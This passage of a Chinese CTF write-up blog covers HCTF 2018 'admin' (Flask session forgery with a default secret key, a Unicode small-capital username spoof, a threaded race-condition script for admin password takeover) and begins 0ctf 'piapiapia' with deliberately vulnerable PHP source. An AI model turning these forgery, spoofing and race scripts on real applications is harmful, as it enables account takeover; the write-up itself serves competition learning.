session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(decryption(sys.argv[<span class="number">1</span>].encode()))</span><br></pre></td></tr></table></figure>

<p>然后可以尝试读取我们的session内容</p>
<p><a href="https://p5.ssl.qhimg.com/t01d379cb422b901767.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t01d379cb422b901767.png" alt="img"></a></p>
<p>此时容易想到伪造admin得到flag，因为看到代码中</p>
<p><a href="https://p2.ssl.qhimg.com/t017e7e3269015fdfd8.png" target="_blank" rel="noopener"><img src="https://p2.ssl.qhimg.com/t017e7e3269015fdfd8.png" alt="img"></a></p>
<p>想到把name伪造为admin，于是github上找了个脚本</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/noraj/</span>flask-session-cookie-manager</span><br></pre></td></tr></table></figure>

<p>尝试伪造</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">u'csrf_token'</span>: <span class="string">'bedddc7469bf16ac02ffd69664abb7abf7e3529c'</span>, <span class="string">u'user_id'</span>: <span class="string">u'1'</span>, <span class="string">u'name'</span>: <span class="string">u'admin'</span>, <span class="string">u'image'</span>: <span class="string">'aHme'</span>, <span class="string">u'_fresh'</span>: <span class="literal">True</span>, <span class="string">u'_id'</span>: <span class="string">'26a01e32366425679ab7738579d3ef6795cad198cd94529cb495fcdccc9c3c864f851207101b38feb17ea8e7e7d096de8cad480b656f785991abc8656938182e'</span>&#125;</span><br></pre></td></tr></table></figure>

<p>但是需要SECRET_KEY</p>
<p>我们发现config.py中存在</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SECRET_KEY = os<span class="selector-class">.environ</span><span class="selector-class">.get</span>(<span class="string">'SECRET_KEY'</span>) or <span class="string">'ckj123'</span></span><br></pre></td></tr></table></figure>

<p>于是尝试ckj123</p>
<p><a href="https://p3.ssl.qhimg.com/t011f2f495345b7b523.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t011f2f495345b7b523.png" alt="img"></a></p>
<p>但是比赛的时候很遗憾，最后以失败告终，当时以为key不是SECRET_KEY，就没有深究</p>
<p>后来发现问题<a href="https://graneed.hatenablog.com/entry/2018/11/11/212048" target="_blank" rel="noopener">https://graneed.hatenablog.com/entry/2018/11/11/212048</a></p>
<p>似乎python3和python2的flask session生成机制不同</p>
<p><a href="https://p5.ssl.qhimg.com/t01ccc362b56b3fc055.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t01ccc362b56b3fc055.png" alt="img"></a></p>
<p>改用python3生成即可成功伪造管理员</p>
<p><a href="https://p1.ssl.qhimg.com/t01312c49a0bdefdff2.png" target="_blank" rel="noopener"><img src="https://p1.ssl.qhimg.com/t01312c49a0bdefdff2.png" alt="img"></a></p>
<h4 id="解法二：Unicode欺骗（预期解）"><a href="#解法二：Unicode欺骗（预期解）" class="headerlink" title="解法二：Unicode欺骗（预期解）"></a>解法二：Unicode欺骗（预期解）</h4><p>在非常迷茫的时候，肯定想到必须得结合改密码功能，那会不会是change这里有问题，于是仔细去看代码，发现这样一句</p>
<p><a href="https://p1.ssl.qhimg.com/t01a62718e1f4b58647.png" target="_blank" rel="noopener"><img src="https://p1.ssl.qhimg.com/t01a62718e1f4b58647.png" alt="img"></a></p>
<p>好奇怪，为什么要转小写呢？</p>
<p>难道注册的时候没有转大小写吗？</p>
<p><a href="https://p0.ssl.qhimg.com/t0185c9b99610dec9e3.png" target="_blank" rel="noopener"><img src="https://p0.ssl.qhimg.com/t0185c9b99610dec9e3.png" alt="img"></a></p>
<p><a href="https://p2.ssl.qhimg.com/t0142ed79c38e510873.png" target="_blank" rel="noopener"><img src="https://p2.ssl.qhimg.com/t0142ed79c38e510873.png" alt="img"></a></p>
<p>但随后发现注册和登录都用了转小写，注册ADMIN的计划失败</p>
<p>但是又有一个特别的地方，我们python转小写一般用的都是lower()，为什么这里是strlower()?</p>
<p>有没有什么不一样的地方呢？于是想到跟进一下函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strlower</span><span class="params">(username)</span>:</span></span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure>

<p>本能的去研究了一下nodeprep.prepare</p>
<p>找到对应的库</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/twisted/</span>twisted</span><br></pre></td></tr></table></figure>

<p>这个方法很容易懂，即将大写字母转为小写</p>
<p>但是很快就容易发现问题</p>
<p><a href="https://p2.ssl.qhimg.com/t01c3ca861181957082.png" target="_blank" rel="noopener"><img src="https://p2.ssl.qhimg.com/t01c3ca861181957082.png" alt="img"></a></p>
<p><a href="https://p5.ssl.qhimg.com/t01ece0c53877fc0052.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t01ece0c53877fc0052.png" alt="img"></a></p>
<p>版本差的可真多，十有八九这里有猫腻</p>
<h5 id="unicode问题"><a href="#unicode问题" class="headerlink" title="unicode问题"></a>unicode问题</h5><p>后来搜到这样一篇文章</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span><span class="comment">//tw.saowen.com/a/72b7816b29ef30533882a07a4e1040f696b01e7888d60255ab89d37cf2f18f3e</span></span><br></pre></td></tr></table></figure>

<p>对于如下字母</p>
<p><a href="https://p1.ssl.qhimg.com/t01b1cdb8fd0fdb6a3c.png" target="_blank" rel="noopener"><img src="https://p1.ssl.qhimg.com/t01b1cdb8fd0fdb6a3c.png" alt="img"></a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘʀꜱᴛᴜᴠᴡʏᴢ</span><br></pre></td></tr></table></figure>

<p>具体编码可查<a href="https://unicode-table.com/en/search/?q=small+capital" target="_blank" rel="noopener">https://unicode-table.com/en/search/?q=small+capital</a></p>
<p>nodeprep.prepare会进行如下操作</p>
<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ᴀ -&gt; A -&gt; a</span><br></pre></td></tr></table></figure>

<p><a href="https://p1.ssl.qhimg.com/t01e6150cb114639c0d.png" target="_blank" rel="noopener"><img src="https://p1.ssl.qhimg.com/t01e6150cb114639c0d.png" alt="img"></a></p>
<p>即第一次将其转换为大写，第二次将其转换为小写</p>
<p>那么是否可以用来bypass题目呢？</p>
<h5 id="攻击构造"><a href="#攻击构造" class="headerlink" title="攻击构造"></a>攻击构造</h5><p>我们容易想到一个攻击链：</p>
<ul>
<li>注册用户ᴀdmin，实则注册了Admin</li>
<li>登录用户ᴀdmin，变成Admin</li>
<li>修改密码Admin，更改了admin的密码</li>
</ul>
<p>于是成功得到如下flag</p>
<p><a href="https://p4.ssl.qhimg.com/t01ff30572eb8252865.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t01ff30572eb8252865.png" alt="img"></a></p>
<h5 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h5><p>这里的unicode欺骗，让我想起了一道sql注入题目</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">skysec.top/<span class="number">2018</span>/<span class="number">03</span>/<span class="number">21</span>/从一道题深入mysql字符集与比对方法collation/</span><br></pre></td></tr></table></figure>



<h4 id="解法三：条件竞争"><a href="#解法三：条件竞争" class="headerlink" title="解法三：条件竞争"></a>解法三：条件竞争</h4><p>该方法也是赛后交流才发现的，感觉有点意思</p>
<p>### </p>
<p>我们发现代码在处理session赋值的时候</p>
<p><a href="https://p2.ssl.qhimg.com/t015483fb615c3f782b.png" target="_blank" rel="noopener"><img src="https://p2.ssl.qhimg.com/t015483fb615c3f782b.png" alt="img"></a></p>
<p><a href="https://p4.ssl.qhimg.com/t0169918a9c850e8ec9.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t0169918a9c850e8ec9.png" alt="img"></a><br>两个危险操作，一个登陆一个改密码，都是在不安全check身份的情况下，直接先赋值了session</p>
<p>那么这里就会存在一些风险</p>
<p>那么我们设想，能不能利用这一点，改掉admin的密码呢？</p>
<p>例如：</p>
<ul>
<li>我们登录sky用户，得到session a</li>
<li>用session a去登录触发admin赋值</li>
<li>改密码，此时session a已经被更改为session b了，即session name=admin</li>
<li>成功更改admin的密码</li>
</ul>
<p>但是构想是美好的，这里存在问题，即前两步中，如果我们的Session a是登录后的，那么是无法再去登录admin的</p>
<p><a href="https://p2.ssl.qhimg.com/t019e3bbbe0d730d41d.png" target="_blank" rel="noopener"><img src="https://p2.ssl.qhimg.com/t019e3bbbe0d730d41d.png" alt="img"></a></p>
<p>我们会在第一步直接跳转，所以这里需要条件竞争</p>
<h5 id="条件竞争思路"><a href="#条件竞争思路" class="headerlink" title="条件竞争思路"></a>条件竞争思路</h5><p>那么能不能避开这个check呢？</p>
<p>答案是显然的，我们双线并进</p>
<p>当我们的一个进程运行到改密码</p>
<p><a href="https://p0.ssl.qhimg.com/t01d48a760805ea0e10.png" target="_blank" rel="noopener"><img src="https://p0.ssl.qhimg.com/t01d48a760805ea0e10.png" alt="img"></a></p>
<p>这里的时候</p>
<p>我们的另一个进程正好退出了这个用户，并且来到了登录的这个位置</p>
<p><a href="https://p3.ssl.qhimg.com/t018dad3539436692a9.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t018dad3539436692a9.png" alt="img"></a></p>
<p>此时正好session name变为admin，change密码正好更改了管理员密码</p>
<h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><p>这里直接用研友syang<a href="https://github.com/Whitzard" target="_blank" rel="noopener">@Whitzard</a>的脚本了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(s, username, password)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'username'</span>: username,</span><br><span class="line">        <span class="string">'password'</span>: password,</span><br><span class="line">        <span class="string">'submit'</span>: <span class="string">''</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s.post(<span class="string">"http://admin.2018.hctf.io/login"</span>, data=data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> s.get(<span class="string">"http://admin.2018.hctf.io/logout"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(s, newpassword)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'newpassword'</span>:newpassword</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s.post(<span class="string">"http://admin.2018.hctf.io/change"</span>, data=data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func1</span><span class="params">(s)</span>:</span></span><br><span class="line">    login(s, <span class="string">'skysec'</span>, <span class="string">'skysec'</span>)</span><br><span class="line">    change(s, <span class="string">'skysec'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func2</span><span class="params">(s)</span>:</span></span><br><span class="line">    logout(s)</span><br><span class="line">    res = login(s, <span class="string">'admin'</span>, <span class="string">'skysec'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'&lt;a href="/index"&gt;/index&lt;/a&gt;'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        print(<span class="string">'finish'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        s = requests.Session()</span><br><span class="line">        t1 = threading.Thread(target=func1, args=(s,))</span><br><span class="line">        t2 = threading.Thread(target=func2, args=(s,))</span><br><span class="line">        t1.start()</span><br><span class="line">        t2.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h3 id="piapiapia-（代码审计，反序列化字符溢出）"><a href="#piapiapia-（代码审计，反序列化字符溢出）" class="headerlink" title="piapiapia （代码审计，反序列化字符溢出）"></a>piapiapia （代码审计，反序列化字符溢出）</h3><p>wp参考：<a href="http://yqxiaojunjie.com/index.php/archives/171/" target="_blank" rel="noopener">http://yqxiaojunjie.com/index.php/archives/171/</a></p>
<p>知道0ctf比较难，没想到这么难..<br>思路明确，就是不会 T^T<br>就撸了一道审计题</p>
<p>一个很简单的登陆系统，<a href="http://www.zip源码泄露，" target="_blank" rel="noopener">www.zip源码泄露，</a></p>
<p>先放一张超萌的喵</p>
<p><a href="http://www.yqxiaojunjie.com/usr/uploads/2016/03/3900178463.png" target="_blank" rel="noopener"><img src="http://www.yqxiaojunjie.com/usr/uploads/2016/03/3900178463.png" alt="0ctf1.png"></a></p>
<p>重要的源码给出</p>
<p>config.php</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    $config[<span class="string">'hostname'</span>] = <span class="string">'127.0.0.1'</span>;</span></span><br><span class="line"><span class="php">    $config[<span class="string">'username'</span>] = <span class="string">'root'</span>;</span></span><br><span class="line"><span class="php">    $config[<span class="string">'password'</span>] = <span class="string">''</span>;</span></span><br><span class="line"><span class="php">    $config[<span class="string">'database'</span>] = <span class="string">''</span>;</span></span><br><span class="line"><span class="php">    $flag = <span class="string">''</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>flag在config.php文件中</p>
<p>class.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'config.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span> <span class="keyword">extends</span> <span class="title">mysql</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $table = <span class="string">'users'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_exists</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">        $username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line"></span><br><span class="line">        $where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">        $username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">        $password = <span class="keyword">parent</span>::filter($password);</span><br><span class="line"></span><br><span class="line">        $key_list = <span class="keyword">Array</span>(<span class="string">'username'</span>, <span class="string">'password'</span>);</span><br><span class="line">        $value_list = <span class="keyword">Array</span>($username, md5($password));</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">parent</span>::insert(<span class="keyword">$this</span>-&gt;table, $key_list, $value_list);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">        $username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">        $password = <span class="keyword">parent</span>::filter($password);</span><br><span class="line"></span><br><span class="line">        $where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">        $object = <span class="keyword">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line">        <span class="keyword">if</span> ($object &amp;&amp; $object-&gt;password === md5($password)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">        $username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line"></span><br><span class="line">        $where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">        $object = <span class="keyword">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line">        <span class="keyword">return</span> $object-&gt;profile;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span><span class="params">($username, $new_profile)</span> </span>&#123;</span><br><span class="line">        $username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">        $new_profile = <span class="keyword">parent</span>::filter($new_profile);</span><br><span class="line"></span><br><span class="line">        $where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">'profile'</span>, $new_profile, $where);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $link = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span><span class="params">($config)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;link = mysql_connect(</span><br><span class="line">            $config[<span class="string">'hostname'</span>],</span><br><span class="line">            $config[<span class="string">'username'</span>], </span><br><span class="line">            $config[<span class="string">'password'</span>]</span><br><span class="line">        );</span><br><span class="line">        mysql_select_db($config[<span class="string">'database'</span>]);</span><br><span class="line">        mysql_query(<span class="string">"SET sql_mode='strict_all_tables'"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;link;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span><span class="params">($table, $where, $ret = <span class="string">'*'</span>)</span> </span>&#123;</span><br><span class="line">        $sql = <span class="string">"SELECT $ret FROM $table WHERE $where"</span>;</span><br><span class="line">        $result = mysql_query($sql, <span class="keyword">$this</span>-&gt;link);</span><br><span class="line">        <span class="keyword">return</span> mysql_fetch_object($result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span><span class="params">($table, $key_list, $value_list)</span> </span>&#123;</span><br><span class="line">        $key = implode(<span class="string">','</span>, $key_list);</span><br><span class="line">        $value = <span class="string">'\''</span> . implode(<span class="string">'\',\''</span>, $value_list) . <span class="string">'\''</span>; </span><br><span class="line">        $sql = <span class="string">"INSERT INTO $table ($key) VALUES ($value)"</span>;</span><br><span class="line">        <span class="keyword">return</span> mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">($table, $key, $value, $where)</span> </span>&#123;</span><br><span class="line">        $sql = <span class="string">"UPDATE $table SET $key = '$value' WHERE $where"</span>;</span><br><span class="line">        <span class="keyword">return</span> mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">        $escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>);       <span class="comment">#\   \\ </span></span><br><span class="line">        $escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>;</span><br><span class="line">        $string = preg_replace($escape, <span class="string">'_'</span>, $string);</span><br><span class="line"></span><br><span class="line">        $safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">        $safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>;</span><br><span class="line">        <span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">session_start();</span><br><span class="line">$user = <span class="keyword">new</span> user();</span><br><span class="line">$user-&gt;connect($config);</span><br></pre></td></tr></table></figure>

<p>update.php</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    <span class="keyword">require_once</span>(<span class="string">'class.php'</span>);</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] == <span class="keyword">null</span>) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">'Login First'</span>); </span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($_POST[<span class="string">'phone'</span>] &amp;&amp; $_POST[<span class="string">'email'</span>] &amp;&amp; $_POST[<span class="string">'nickname'</span>] &amp;&amp; $_FILES[<span class="string">'photo'</span>]) &#123;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        $username = $_SESSION[<span class="string">'username'</span>];</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(!preg_match(<span class="string">'/^\d&#123;11&#125;$/'</span>, $_POST[<span class="string">'phone'</span>]))</span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>(<span class="string">'Invalid phone'</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(!preg_match(<span class="string">'/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/'</span>, $_POST[<span class="string">'email'</span>]))</span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>(<span class="string">'Invalid email'</span>);</span></span><br><span class="line"><span class="php">        </span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class="string">'nickname'</span>]) || strlen($_POST[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        $file = $_FILES[<span class="string">'photo'</span>];</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>($file[<span class="string">'size'</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> $file[<span class="string">'size'</span>] &gt; <span class="number">1000000</span>)</span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>(<span class="string">'Photo size error'</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        move_uploaded_file($file[<span class="string">'tmp_name'</span>], <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]));</span></span><br><span class="line"><span class="php">        $profile[<span class="string">'phone'</span>] = $_POST[<span class="string">'phone'</span>];</span></span><br><span class="line"><span class="php">        $profile[<span class="string">'email'</span>] = $_POST[<span class="string">'email'</span>];</span></span><br><span class="line"><span class="php">        $profile[<span class="string">'nickname'</span>] = $_POST[<span class="string">'nickname'</span>];</span></span><br><span class="line"><span class="php">        $profile[<span class="string">'photo'</span>] = <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        $user-&gt;update_profile($username, serialize($profile));</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'Update Profile Success!&lt;a href="profile.php"&gt;Your Profile&lt;/a&gt;'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>profile.php</p>
